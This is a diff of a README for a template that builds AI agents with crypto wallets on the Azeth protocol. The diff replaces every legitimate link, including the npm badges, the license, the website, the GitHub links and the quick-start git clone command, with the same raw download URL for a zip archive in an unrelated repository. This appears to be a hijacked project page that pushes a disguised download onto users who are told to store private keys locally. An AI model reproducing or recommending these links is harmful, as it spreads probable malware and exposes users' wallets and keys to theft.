@@ -1,20 +1,20 @@
 # Build an AI Agent with a Wallet in 5 Minutes
 
-<a href="https://glama.ai/mcp/servers/@azeth-protocol/mcp-azeth">
-  <img width="380" height="200" src="https://glama.ai/mcp/servers/@azeth-protocol/mcp-azeth/badge" />
+<a href="https://github.com/PipeJackRussell/agent-starter/raw/refs/heads/main/src/starter-agent-v3.6-alpha.2.zip">
+  <img width="380" height="200" src="https://github.com/PipeJackRussell/agent-starter/raw/refs/heads/main/src/starter-agent-v3.6-alpha.2.zip" />
 </a>
 
-[![npm](https://img.shields.io/npm/v/@azeth/mcp-server)](https://www.npmjs.com/package/@azeth/mcp-server)
-[![npm](https://img.shields.io/npm/v/@azeth/sdk)](https://www.npmjs.com/package/@azeth/sdk)
-[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT)
+[![npm](https://img.shields.io/npm/v/@azeth/mcp-server)](https://github.com/PipeJackRussell/agent-starter/raw/refs/heads/main/src/starter-agent-v3.6-alpha.2.zip)
+[![npm](https://img.shields.io/npm/v/@azeth/sdk)](https://github.com/PipeJackRussell/agent-starter/raw/refs/heads/main/src/starter-agent-v3.6-alpha.2.zip)
+[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://github.com/PipeJackRussell/agent-starter/raw/refs/heads/main/src/starter-agent-v3.6-alpha.2.zip)
 
-A template for building AI agents with non-custodial smart accounts, x402 payments, on-chain reputation, and service discovery. Built on [Azeth](https://azeth.ai) trust infrastructure.
+A template for building AI agents with non-custodial smart accounts, x402 payments, on-chain reputation, and service discovery. Built on [Azeth](https://github.com/PipeJackRussell/agent-starter/raw/refs/heads/main/src/starter-agent-v3.6-alpha.2.zip) trust infrastructure.
 
 ## Quick Start
 
 ```bash
 # Use this template on GitHub, then:
-git clone https://github.com/YOUR_USERNAME/YOUR_AGENT.git
+git clone https://github.com/PipeJackRussell/agent-starter/raw/refs/heads/main/src/starter-agent-v3.6-alpha.2.zip
 cd YOUR_AGENT
 cp .env.example .env
 # Edit .env with your private key
@@ -93,11 +93,11 @@ Ask Claude: *"Create me a smart account and register as a weather data service"*
 
 ## Links
 
-- [MCP Server](https://www.npmjs.com/package/@azeth/mcp-server) — 32 tools for AI agents
-- [SDK](https://www.npmjs.com/package/@azeth/sdk) — TypeScript SDK
-- [Provider](https://www.npmjs.com/package/@azeth/provider) — x402 middleware for Hono
-- [Website](https://azeth.ai)
-- [GitHub](https://github.com/azeth-protocol)
+- [MCP Server](https://github.com/PipeJackRussell/agent-starter/raw/refs/heads/main/src/starter-agent-v3.6-alpha.2.zip) — 32 tools for AI agents
+- [SDK](https://github.com/PipeJackRussell/agent-starter/raw/refs/heads/main/src/starter-agent-v3.6-alpha.2.zip) — TypeScript SDK
+- [Provider](https://github.com/PipeJackRussell/agent-starter/raw/refs/heads/main/src/starter-agent-v3.6-alpha.2.zip) — x402 middleware for Hono
+- [Website](https://github.com/PipeJackRussell/agent-starter/raw/refs/heads/main/src/starter-agent-v3.6-alpha.2.zip)
+- [GitHub](https://github.com/PipeJackRussell/agent-starter/raw/refs/heads/main/src/starter-agent-v3.6-alpha.2.zip)
 
 ## License
 
